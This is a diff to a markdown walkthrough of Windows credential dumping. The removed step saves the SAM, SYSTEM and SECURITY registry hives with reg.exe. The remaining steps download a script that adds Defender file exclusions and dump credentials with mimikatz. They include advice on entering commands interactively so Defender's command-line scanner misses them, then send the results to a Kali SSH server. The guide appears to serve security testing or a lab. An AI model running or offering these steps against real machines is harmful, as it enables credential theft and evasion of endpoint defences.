@@ -13,19 +13,7 @@ cd <your_drive>:\
 
 ---
 
-### Step 2: Dump Registry (Reg.exe)
-```powershell
-del *.save
-dir *.save
-reg.exe save hklm\sam sam.save
-reg.exe save hklm\system system.save
-reg.exe save hklm\security security.save
-dir *.save
-```
-
----
-
-### Step 3: Download Add-TrustedFileExclusion.ps1
+### Step 2: Download Add-TrustedFileExclusion.ps1
 ```powershell
 del Add-TrustedFileExclusion.ps1
 dir Add-TrustedFileExclusion.ps1
@@ -35,7 +23,7 @@ dir Add-TrustedFileExclusion.ps1
 
 ---
 
-### Step 4: Dump Registry (mimikatz)
+### Step 3: Dump Registry (mimikatz)
 
 > **Note:** mimikatz commands must be entered interactively. Passing them as command-line arguments triggers Defender's CmdLine scanner and results in immediate remediation regardless of file exclusions.
 
@@ -73,7 +61,7 @@ dir mimikatz.log
 
 ---
 
-### Step 5: Run dump-your-pc.ps1
+### Step 4: Run dump-your-pc.ps1
 
 > **Before running:** Start the Kali SSH server so the script can transfer files automatically.
 > ```bash
